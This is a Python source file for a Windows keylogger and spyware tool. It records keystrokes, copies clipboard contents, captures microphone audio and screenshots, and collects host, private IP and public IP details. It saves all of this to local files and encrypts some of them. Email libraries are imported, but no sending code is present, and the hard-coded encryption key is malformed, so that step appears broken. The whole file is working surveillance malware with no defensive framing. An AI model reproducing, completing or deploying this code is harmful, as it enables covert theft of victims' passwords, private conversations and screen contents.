from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart 
from email import encoders
import socket
import platform
import win32clipboard
from pynput.keyboard import Key,Listener
import time
import os
from scipy.io.wavfile import write
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process,freeze_support
from PIL import ImageGrab
import smtplib
import sounddevice as sd

key="hariharanR"
keys_information ="key_log.txt"
system_information="systeminfo.txt"
clipboard_information ="clipboard.txt"
audio_information ="audio.wav"
microphone_time =10
screenshot_information="screenshot.png"
keys_information_e="e_key_log.txt"
system_information_e="e_systeminfo.txt"
clipboard_information_e ="e_clipboard.txt"
time_iteration =15
number_of_iterations_end =3
file_path="D:\\python\\Keylogger\\File"
extend ="\\"
file_merge=file_path +extend
def computer_information():
    with open(file_path+extend+system_information,"a") as f:
        hostname =socket.gethostname()
        IPAddr=socket.gethostbyname(hostname)
        try:
            public_ip=get("https://api.ipify.org").text
            f.write("Public IP Address :"+public_ip)
        except Exception:
            f.write("Couldn't get public IP Address")
        
        f.write("Processor :"+(platform.processor()+'\n'))
        f.write("System:"+platform.system()+" "+platform.version()+'\n')
        f.write("Machine :"+platform.machine()+'\n')
        f.write("Hostname :"+hostname+'\n')
        f.write("Private IP Address :"+IPAddr+'\n')
        
computer_information()  

def copy_clipboard():
    with open(file_path+extend+clipboard_information,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            f.write("Clipboard Data :\n" +pasted_data)
        except:
            f.write("Clipboard could be not be copied")
            

def microphone():
    fs=44100
    second =microphone_time
    myrecording =sd.rec(int(second*fs),samplerate=fs,channels=2)
    sd.wait()
    
    write(file_path+extend+audio_information,fs,myrecording)
microphone()

def screenshot():
    im=ImageGrab.grab()
    im.save(file_path+extend+screenshot_information)

number_of_iterations =0
currentTime=time.time()
stoppingTime=time.time()+time_iteration

while number_of_iterations<number_of_iterations_end:
    
    count =0
    keys=[]

    def on_press(key):
        global keys,count,currentTime
        
        print(key)
        keys.append(key)
        count +=1
        currentTime=time.time()
        
        if count >=1:
            count =0
            write_file(keys)
            keys=[]
        
    def write_file(keys):
        with open(file_path+extend+keys_information,"a") as f:
            for key in keys:
                k=str(key).replace("'","")
                if k.find("space") >0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") ==-1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key ==Key.esc:
            return False
        if currentTime>stoppingTime:
            return False

    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join() 
    if currentTime>stoppingTime:
        with open(file_path+extend+keys_information,"w") as f:
            f.write(" ")
        screenshot()
        copy_clipboard()
        number_of_iterations +=1
        currentTime=time.time()
        stoppingTime=time.time()+time_iteration
            
     
file_to_encrypt=[file_merge+system_information,file_merge+clipboard_information,file_merge+keys_information]
encrypted_file_names=[file_merge+system_information_e,file_merge+clipboard_information_e,file_merge+keys_information_e]
count=0
for encrypting_file in file_to_encrypt:
    with open(file_to_encrypt[count],'rb') as f:
        data=f.read()
    fernet=Fernet(key)
    encrypted=fernet.encrypt(data)
    with open(encrypted_file_names[count],'wb') as f:
        f.write(encrypted)
    count+=1

time.sleep(120)